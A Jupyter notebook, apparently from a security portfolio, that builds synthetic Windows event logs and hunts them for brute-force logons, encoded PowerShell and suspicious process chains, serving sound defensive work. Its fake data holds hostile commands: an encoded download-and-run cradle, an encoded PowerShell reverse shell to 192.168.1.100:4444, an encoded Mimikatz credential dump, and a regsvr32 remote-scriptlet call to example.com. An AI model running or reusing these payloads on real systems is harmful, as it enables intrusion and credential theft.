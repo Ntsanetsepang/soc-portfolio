{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Threat Hunting Analysis Notebook\n",
    "\n",
    "This notebook demonstrates threat hunting techniques using Python data analysis. It includes:\n",
    "\n",
    "- Loading and processing security event logs\n",
    "- Analyzing authentication patterns\n",
    "- Detecting suspicious PowerShell commands\n",
    "- Using machine learning to identify anomalies\n",
    "- Visualizing results\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Import necessary libraries\n",
    "import pandas as pd\n",
    "import numpy as np\n",
    "import matplotlib.pyplot as plt\n",
    "import seaborn as sns\n",
    "from datetime import datetime, timedelta\n",
    "import re\n",
    "from sklearn.cluster import DBSCAN\n",
    "from sklearn.preprocessing import StandardScaler\n",
    "\n",
    "# Set plot styling\n",
    "plt.style.use('ggplot')\n",
    "sns.set(style=\"darkgrid\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Data Preparation\n",
    "\n",
    "For this demonstration, we'll generate synthetic Windows security event data. In a real threat hunting scenario, you would load actual log data from your SIEM or log management system."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Create synthetic Windows Security Event data\n",
    "def generate_synthetic_security_events(num_events=1000):\n",
    "    # Create timestamp range (last 7 days)\n",
    "    end_time = datetime.now()\n",
    "    start_time = end_time - timedelta(days=7)\n",
    "    timestamps = [start_time + timedelta(\n",
    "        seconds=np.random.randint(0, int((end_time - start_time).total_seconds())))\n",
    "        for _ in range(num_events)]\n",
    "    \n",
    "    # Create event data\n",
    "    event_ids = np.random.choice([4624, 4625, 4634, 4648, 4688, 4672], size=num_events, p=[0.4, 0.1, 0.2, 0.1, 0.15, 0.05])\n",
    "    users = np.random.choice(['admin', 'jsmith', 'alee', 'rjones', 'system', 'service_acct'], size=num_events, p=[0.1, 0.3, 0.2, 0.2, 0.1, 0.1])\n",
    "    source_ips = np.random.choice(['192.168.1.10', '192.168.1.20', '192.168.1.30', '10.0.0.15', '10.0.0.20', '172.16.0.5'], size=num_events)\n",
    "    \n",
    "    # Add some suspicious events\n",
    "    # 1. Late night logons for specific user\n",
    "    for i in range(20):\n",
    "        idx = np.random.randint(0, num_events)\n",
    "        timestamps[idx] = timestamps[idx].replace(hour=np.random.randint(23, 24) or np.random.randint(0, 5))\n",
    "        users[idx] = 'jsmith'\n",
    "        event_ids[idx] = 4624\n",
    "    \n",
    "    # 2. Failed logon attempts\n",
    "    for i in range(30):\n",
    "        idx = np.random.randint(0, num_events)\n",
    "        timestamps[idx] = timestamps[idx].replace(hour=np.random.randint(0, 24))\n",
    "        users[idx] = 'admin'\n",
    "        event_ids[idx] = 4625\n",
    "        source_ips[idx] = '10.0.0.50'  # Suspicious IP\n",
    "    \n",
    "    # Create DataFrame\n",
    "    df = pd.DataFrame({\n",
    "        'Timestamp': timestamps,\n",
    "        'EventID': event_ids,\n",
    "        'User': users,\n",
    "        'SourceIP': source_ips,\n",
    "        'Computer': np.random.choice(['WORKSTATION01', 'WORKSTATION02', 'SERVER01', 'SERVER02'], size=num_events)\n",
    "    })\n",
    "    \n",
    "    # Add process information for EventID 4688\n",
    "    process_names = ['cmd.exe', 'powershell.exe', 'explorer.exe', 'svchost.exe', 'regsvr32.exe', 'rundll32.exe']\n",
    "    process_paths = ['C:\\\\Windows\\\\System32\\\\', 'C:\\\\Windows\\\\SysWOW64\\\\', 'C:\\\\Program Files\\\\', 'C:\\\\Users\\\\Admin\\\\Downloads\\\\']\n",
    "    \n",
    "    # Add command line data\n",
    "    df['ProcessName'] = np.nan\n",
    "    df['CommandLine'] = np.nan\n",
    "    \n",
    "    for idx, row in df.iterrows():\n",
    "        if row['EventID'] == 4688:\n",
    "            process = np.random.choice(process_names)\n",
    "            path = np.random.choice(process_paths)\n",
    "            df.at[idx, 'ProcessName'] = path + process\n",
    "            \n",
    "            # Generate command line based on process\n",
    "            if process == 'cmd.exe':\n",
    "                df.at[idx, 'CommandLine'] = 'cmd.exe /c ' + np.random.choice(['dir', 'type', 'whoami', 'net user', 'ipconfig'])\n",
    "            elif process == 'powershell.exe':\n",
    "                df.at[idx, 'CommandLine'] = 'powershell.exe ' + np.random.choice(['-Command Get-Process', '-NoProfile -ExecutionPolicy Bypass', '-EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB4AGEAbQBwAGwAZQAuAGMAbwBtAC8AcwBjAHIAaQBwAHQALgBwAHMAMQAnACkA'])\n",
    "            elif process == 'regsvr32.exe':\n",
    "                df.at[idx, 'CommandLine'] = 'regsvr32.exe ' + np.random.choice(['/s /u /i:http://example.com/file.sct scrobj.dll', path + 'library.dll'])\n",
    "    \n",
    "    # Add some suspicious PowerShell commands\n",
    "    suspicious_idx = df[(df['ProcessName'] == 'C:\\\\Windows\\\\System32\\\\powershell.exe') & (df['User'] == 'jsmith')].sample(5).index\n",
    "    for idx in suspicious_idx:\n",
    "        df.at[idx, 'CommandLine'] = 'powershell.exe -EncodedCommand ' + np.random.choice(['SQBuAHYAbwBrAGUALQBNAGkAbQBpAGsAYQB0AHoAIAAtAEQAdQBtAHAAQwByAGUAZABzAA==', 'JGMgPSBOZXctT2JqZWN0IFN5c3RlbS5OZXQuU29ja2V0cy5UQ1BDbGllbnQoIjE5Mi4xNjguMS4xMDAiLDQ0NDQpOyRzID0gJGMuR2V0U3RyZWFtKCk7W2J5dGVbXV0kYiA9IDAuLjY1NTM1fCV7MH07d2hpbGUoKCRpID0gJHMuUmVhZCgkYiwgMCwgJGIuTGVuZ3RoKSkgLW5lIDApezskZCA9IChOZXctT2JqZWN0IC1UeXBlTmFtZSBTeXN0ZW0uVGV4dC5BU0NJSUVuY29kaW5nKS5HZXRTdHJpbmcoJGJbMC4uKCRpLTEpXSk7JHNiID0gKGlleCBcIiRkXCIgMj4mMSB8IE91dC1TdHJpbmcgKTskc2IyICA9ICRzYiArIFwiUFMgXCIgKyAocHdkKS5QYXRoICsgXCI+IFwiOyRzLldyaXRlKChbdGV4dC5lbmNvZGluZ106OkFTQ0lJKS5HZXRCeXRlcygkc2IyKSwwLCRzYjIuTGVuZ3RoKTt9OyRjLkNsb3NlKCk='])\n",
    "    \n",
    "    return df\n",
    "\n",
    "# Generate data\n",
    "security_events_df = generate_synthetic_security_events(1500)\n",
    "\n",
    "# Display the first few rows\n",
    "security_events_df.head()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Data Exploration\n",
    "\n",
    "Let's explore the basic characteristics of our security event data."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Basic data exploration\n",
    "print(f\"Data shape: {security_events_df.shape}\")\n",
    "\n",
    "# Event ID distribution\n",
    "print(\"\\nEvent ID distribution:\")\n",
    "security_events_df['EventID'].value_counts()\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# User distribution\n",
    "print(\"\\nUser distribution:\")\n",
    "security_events_df['User'].value_counts()\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Authentication Pattern Analysis\n",
    "\n",
    "Let's analyze authentication patterns to identify potential anomalies."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Filter for logon events\n",
    "logon_events = security_events_df[security_events_df['EventID'].isin([4624, 4625])].copy()\n",
    "logon_events['Hour'] = logon_events['Timestamp'].dt.hour\n",
    "\n",
    "# Analyze logon time patterns by user\n",
    "plt.figure(figsize=(12, 6))\n",
    "sns.countplot(x='Hour', hue='User', data=logon_events)\n",
    "plt.title('Logon Events by Hour and User')\n",
    "plt.xlabel('Hour of Day')\n",
    "plt.ylabel('Count')\n",
    "plt.xticks(range(0, 24))\n",
    "plt.legend(title='User')\n",
    "plt.tight_layout()\n",
    "plt.show()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Failed Logon Analysis\n",
    "\n",
    "Let's examine failed logon attempts to identify potential brute force attacks."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Analyze failed logon attempts\n",
    "failed_logons = logon_events[logon_events['EventID'] == 4625].copy()\n",
    "\n",
    "# Group by source IP and user\n",
    "failed_logon_counts = failed_logons.groupby(['SourceIP', 'User']).size().reset_index(name='FailCount')\n",
    "failed_logon_counts = failed_logon_counts.sort_values('FailCount', ascending=False)\n",
    "\n",
    "# Display top sources of failed logons\n",
    "failed_logon_counts.head(10)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Suspicious Process Execution Analysis\n",
    "\n",
    "Let's analyze process execution events to identify potentially malicious activity."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Analyze suspicious process executions\n",
    "process_events = security_events_df[security_events_df['EventID'] == 4688].copy()\n",
    "\n",
    "# Look for suspicious PowerShell commands\n",
    "suspicious_powershell = process_events[process_events['CommandLine'].str.contains('EncodedCommand|Invoke-Mimikatz|IEX|DownloadString|Net.WebClient', na=False)]\n",
    "\n",
    "# Display suspicious PowerShell commands\n",
    "suspicious_powershell[['Timestamp', 'User', 'Computer', 'CommandLine']].head()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Anomaly Detection with Machine Learning\n",
    "\n",
    "Let's use DBSCAN clustering to identify anomalous authentication patterns."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Prepare data for clustering\n",
    "user_auth_features = logon_events.groupby(['User', 'SourceIP']).agg(\n",
    "    logon_count=('EventID', 'count'),\n",
    "    failed_count=('EventID', lambda x: sum(x == 4625)),\n",
    "    distinct_computers=('Computer', 'nunique'),\n",
    "    avg_hour=('Hour', 'mean'),\n",
    "    hour_std=('Hour', 'std')\n",
    ").reset_index()\n",
    "\n",
    "# Fill NaN values\n",
    "user_auth_features['hour_std'].fillna(0, inplace=True)\n",
    "\n",
    "# Scale features\n",
    "scaler = StandardScaler()\n",
    "scaled_features = scaler.fit_transform(user_auth_features[['logon_count', 'failed_count', 'distinct_computers', 'avg_hour', 'hour_std']])\n",
    "\n",
    "# Apply DBSCAN clustering\n",
    "dbscan = DBSCAN(eps=0.8, min_samples=3)\n",
    "user_auth_features['cluster'] = dbscan.fit_predict(scaled_features)\n",
    "\n",
    "# Display anomalies (cluster -1)\n",
    "user_auth_features[user_auth_features['cluster'] == -1]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Process Chain Analysis\n",
    "\n",
    "Let's analyze process execution chains to identify potential attack sequences."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Analyze process execution chains\n",
    "def extract_parent_child_processes(df):\n",
    "    # In a real scenario, this would extract parent-child relationships from actual data\n",
    "    # For this example, we'll create synthetic relationships\n",
    "    process_chains = [\n",
    "        {'parent': 'explorer.exe', 'child': 'cmd.exe', 'user': 'jsmith', 'timestamp': datetime.now() - timedelta(hours=3)},\n",
    "        {'parent': 'cmd.exe', 'child': 'powershell.exe', 'user': 'jsmith', 'timestamp': datetime.now() - timedelta(hours=3, minutes=1)},\n",
    "        {'parent': 'powershell.exe', 'child': 'regsvr32.exe', 'user': 'jsmith', 'timestamp': datetime.now() - timedelta(hours=3, minutes=2)},\n",
    "        {'parent': 'explorer.exe', 'child': 'browser.exe', 'user': 'alee', 'timestamp': datetime.now() - timedelta(hours=5)},\n",
    "        {'parent': 'browser.exe', 'child': 'cmd.exe', 'user': 'alee', 'timestamp': datetime.now() - timedelta(hours=5, minutes=30)},\n",
    "        {'parent': 'cmd.exe', 'child': 'powershell.exe', 'user': 'alee', 'timestamp': datetime.now() - timedelta(hours=5, minutes=31)},\n",
    "    ]\n",
    "    return pd.DataFrame(process_chains)\n",
    "\n",
    "process_chains_df = extract_parent_child_processes(security_events_df)\n",
    "\n",
    "# Display process chains\n",
    "process_chains_df"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Conclusions and Findings\n",
    "\n",
    "Based on our analysis, we've identified several potential security issues:\n",
    "\n",
    "1. Unusual after-hours logon activity for user 'jsmith'\n",
    "2. Multiple failed logon attempts from IP 10.0.0.50 targeting the 'admin' account\n",
    "3. Suspicious PowerShell commands with encoded payloads\n",
    "4. Anomalous authentication patterns for certain user-IP combinations\n",
    "5. Suspicious process execution chain: explorer.exe → cmd.exe → powershell.exe → regsvr32.exe\n",
    "\n",
    "### Recommended Actions:\n",
    "\n",
    "1. Investigate user 'jsmith' for potential account compromise\n",
    "2. Block IP 10.0.0.50 and investigate the source of brute force attempts\n",
    "3. Implement PowerShell constrained language mode and script block logging\n",
    "4. Review and enhance endpoint detection and response (EDR) rules\n",
    "5. Implement additional monitoring for suspicious process chains"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.10"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}